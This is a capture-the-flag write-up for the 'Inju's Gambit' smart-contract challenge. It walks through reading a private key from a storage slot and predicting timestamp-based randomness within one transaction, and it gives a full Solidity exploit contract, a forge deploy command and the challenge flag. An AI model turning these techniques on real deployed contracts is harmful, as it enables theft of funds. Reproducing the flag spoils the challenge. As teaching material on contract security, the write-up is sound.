# Writeup for Inju's Gambit

- Hello h4ck3r, welcome to the world of smart contract hacking. In order to understand this writeup you need to understand foundry.

### Key Concepts To Learn

When interacting with a smart contract, our interactions are conducted through transactions. Calling a function that modifies the state of a deployed contract is considered a transaction. Changing the state involves altering the values of state variables.

In the Ethereum Virtual Machine (EVM), if we call a function of a smart contract that in turn calls another contract's function, both calls will be broadcasted to the Ethereum network as a single transaction and will be mined in the same block. Check the below example to understand it more clear.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract contract_one{
    function guess(uint256 _num) public returns (bool){
        if(_num==block.timestamp){
            return true;
        }
        else{
            revert("Incorrect Guess");
        }
    }
}


contract contract_two{
    contract_one one;
    constructor(address _addr){
        one=contract_one(_addr);
    }
    function call_guess()public returns (bool){
        uint256 guess_num=block.timestamp;
        return one.guess(guess_num);
    }
}

```

First, deploy `contract_one`, then deploy `contract_two`. In `contract_one`, the `guess` function compares `block.timestamp` with the number passed as an argument. If both match, it returns true.

When we call a function, the function call and all its inner calls are executed as part of the same transaction. This means that within the same transaction, `block.timestamp` will remain constant. Therefore, we can calculate the `_num` based on the current `block.timestamp` and pass it to the `guess()` function to ensure a match.

### Challenge Description

Inju owns all the things in the area, waiting for one worthy challenger to emerge. Rumor said, that there many ways from many different angle to tackle Inju. Are you the Challenger worthy to oppose him?

### Exploit

Click [here](./src/contracts/) to view the source contracts.

In this challenge our task is make `isSolved()` function return true.

```solidity
function isSolved() public view returns(bool){
    return address(privileged.challengeManager()) == address(0);
}
```

The isSolved() function returns true if the challengeManager in Privileged contract is set to address of zero.

Now lets dive into Privileged contract.

```solidity
function setManager(address _manager) public onlyOwner{
    challengeManager = _manager;
}

function fireManager() public onlyOwner{
    challengeManager = address(0);
}
```

The only way to change the `challengeManager` is by calling one of the two functions, both of which have the `onlyOwner()` modifier. This modifier ensures that only the Owner can call these functions. The Owner is set to `msg.sender` in the constructor. Since the `Setup` contract deployed the `Privileged` contract, the `casinoOwner` is the `Setup` contract.

Only the `Setup` contract can call the `setManager()` and `fireManager()` functions. However, the `Setup` contract does not have any functions that call `setManager()` or `fireManager()`. Therefore, we need to find a way to change the address of the `casinoOwner` so that we can directly call `fireManager()`.

```solidity
function setNewCasinoOwner(address _newCasinoOwner) public onlyManager{
    casinoOwner = _newCasinoOwner;
}
```

The `setNewCasinoOwner()` function takes an address as an argument and then executes the `onlyManager` modifier. If the modifier passes, it sets the `casinoOwner` to the provided address. Since this function can only be called by the `challengeManager`, we need to examine the `ChallengeManager` contract to find any function that calls `setNewCasinoOwner()` in the `Privileged` contract.

Now let's look into ChallengeManager contract.

```
function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
    if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
        privileged.setNewCasinoOwner(address(theChallenger));
    }
}
```

The `challengeCurrentOwner()` function takes a `bytes32` argument and then executes the `onlyChosenChallenger` modifier. If the modifier passes, it compares the passed `_key` with the original key. If both match, it calls `setNewCasinoOwner()` with the address of `theChallenger` as the argument.

```solidity
modifier onlyChosenChallenger(){
    require(msg.sender == theChallenger, "Not Chosen One");
    _;
}
```

The modifier onlyChosenChallenger() will make sure that the msg.sender (caller) is the address of theChallenger.

If we somehow become `theChallenger`, we can call `challengeCurrentOwner()`. This will call `setNewCasinoOwner()` with our address, making us the `casinoOwner`. Once we become the `casinoOwner`, we can directly call `fireManager()`, which will set the address of `challengeManager` to the zero address, thereby solving our challenge.

The `upgradeChallengerAttribute()` function is the only place where `theChallenger` is changed. However, before delving into this function, we need to understand a bit about the `ChallengeManager` contract and the challenger attributes.

The `ChallengeManager` contract controls the `casinoOwner` in the `Privileged` contract. During the deployment of the `Privileged` contract, the `casinoOwner` is set to the address of the `Setup` contract. The `casinoOwner` can be changed by the `ChallengeManager`. Anyone who wants to challenge the Owner needs to call the `approach()` function by sending 5 ether. After that, the challenger can call the `upgradeChallengerAttribute()` function.

```solidity
function approach() public payable {
        if(msg.value != 5 ether){
            revert CM_NotTheCorrectValue();
        }
        if(approached[msg.sender] == true){
            revert CM_AlreadyApproached();
        }
        approached[msg.sender] = true;
        challenger.push(msg.sender);
        privileged.mintChallenger(msg.sender);
    }
```

When we call the `approach()` function with 5 ether, it sets `approached` of `msg.sender` (the caller) to true. Then, it pushes the `msg.sender` (the caller's address) into the `challenger` array. Finally, it calls `mintChallenger()` in the `Privileged` contract.

```solidity
function mintChallenger(address to) public onlyManager{
    uint256 newChallengerId = challengerCounter++;

    Requirements[newChallengerId] = casinoOwnerChallenger({
        challenger: to,
        isRich: false,
        isImportant: false,
        hasConnection: false,
        hasVIPCard: false
    });
}
```

The `mintChallenger()` function takes an address as an argument. It then initializes and loads the `newChallengerId`, setting the requirements of `newChallengerId` as an instance of the `casinoOwnerChallenger` struct. Except for `challenger`, all attributes of `casinoOwnerChallenger` are initialized to false.

```solidity
function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
        if (challengerId > privileged.challengerCounter()){
            revert CM_InvalidIdOfChallenger();
        }
        if(strangerId > privileged.challengerCounter()){
            revert CM_InvalidIdofStranger();
        }
        if(privileged.getRequirmenets(challengerId).challenger != msg.sender){
            revert CM_CanOnlyChangeSelf();
        }

        uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;

        if (gacha == 0){
            if(privileged.getRequirmenets(strangerId).isRich == false){
                privileged.upgradeAttribute(strangerId, true, false, false, false);
            }else if(privileged.getRequirmenets(strangerId).isImportant == false){
                privileged.upgradeAttribute(strangerId, true, true, false, false);
            }else if(privileged.getRequirmenets(strangerId).hasConnection == false){
                privileged.upgradeAttribute(strangerId, true, true, true, false);
            }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){
                privileged.upgradeAttribute(strangerId, true, true, true, true);
                qualifiedChallengerFound = true;
                theChallenger = privileged.getRequirmenets(strangerId).challenger;
            }
        }else if (gacha == 1){
            if(privileged.getRequirmenets(challengerId).isRich == false){
                privileged.upgradeAttribute(challengerId, true, false, false, false);
            }else if(privileged.getRequirmenets(challengerId).isImportant == false){
                privileged.upgradeAttribute(challengerId, true, true, false, false);
            }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
                privileged.upgradeAttribute(challengerId, true, true, true, false);
            }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
                privileged.upgradeAttribute(challengerId, true, true, true, true);
                qualifiedChallengerFound = true;
                theChallenger = privileged.getRequirmenets(challengerId).challenger;
            }
        }else if(gacha == 2){
            privileged.resetAttribute(challengerId);
            qualifiedChallengerFound = false;
            theChallenger = address(0);
        }else{
            privileged.resetAttribute(strangerId);
            qualifiedChallengerFound = false;
            theChallenger = address(0);
        }
    }
```

The `upgradeChallengerAttribute()` function takes arguments of type `uint256` (`challengerId`) and `uint256` (`strangerId`). The `stillSearchingChallenger` modifier checks if `theChallenger` has already been set. If it is set, the function reverts. Otherwise, it continues execution and gets a random number between 0 and 3. Based on the random value:

- If the value is 0, it sets attributes to the stranger's address.
- If the value is 1, it sets attributes to the challenger's address.
- If either of them has all attributes, they become `theChallenger`.
- If the value is 2, it resets the attributes of the challenger.
- If the value is 3, it resets the attributes of the stranger.

In order to become `theChallenger`, we need to call the `upgradeChallengerAttribute()` function 4 times, ensuring that the gacha value is 1 each time.

We can acheive this by precomputing the gacha value then if the value is one we will call upgradeChallengerAttribute() 4 times with in the single transaction.

When we call `challengeCurrentOwner()`, we need to pass the key. The function will then compare the key we passed with the `masterKey`. If both are the same, we will become the `casinoOwner`.

Since `masterKey` is a private variable, we need to retrieve its value by examining the storage slots.

```shell
$cast storage --rpc-url $RPC_URL $ChallengeManagerAddress 1
```

This will return `0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559`. This is the key.

The key in ASCII is `INJUINJUINJUSUPERKEYKEYKEYKEYKEY`.

#### Steps to Solve the Challenge

1. **Become a Challenger**: Send 5 ether to call the `approach()` function.
2. **Precompute the Gacha Value**: Calculate the gacha value to determine the outcome.
3. **Call `upgradeChallengerAttribute()`**: If the gacha value is zero or one, call `upgradeChallengerAttribute()` four times.
4. **Get the Key Value**: Retrieve the key value by examining the first slot of the `ChallengeManager`.
5. **Call `challengeCurrentOwner()`**: Once you have all attributes, call `challengeCurrentOwner()` to become the `casinoOwner`.
6. **Call `fireManager()`**: As the new `casinoOwner`, call `fireManager()` to set the `challengeManager` address to zero and solve the challenge.

Below is the Exploit contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Setup, Privileged, ChallengeManager} from "src/contracts/Setup.sol";

contract ExploitPrivileged {
    Setup public setup = Setup(//YOUR__SETUP__ADDRESS);
    Privileged public privileged = Privileged(setup.privileged());
    ChallengeManager public challengeManager = ChallengeManager(setup.challengeManager());

    constructor() payable {
        uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
        if (gacha == 0 || gacha == 1) {
            challengeManager.approach{value: 5 ether}();
            for (uint8 i = 0; i < 4; i++) {
                challengeManager.upgradeChallengerAttribute(3, 3);
            }
            challengeManager.challengeCurrentOwner(0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559);
            privileged.fireManager();
        } else {
            revert("Try again");
        }
    }
}
```

```shell
$ forge create ExploitPrivileged --rpc-url $RPC_URL --interactive --value 5ether
```

Thank's it for this challenge.

**Flag:** `TCP1P{is_it_really_a_gambit_tho_its_not_that_hard}`

### Key Takeaways

Even though state variables are private, they can be accessed by anyone through storage slot examination. Therefore, important keys should not be stored on the blockchain.

In our challenge, the gacha value is expected to be a random number, but it can be predicted or manipulated within the same transaction. Instead of determining the random values within the contract, we can use Chainlink oracles to prevent this issue.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
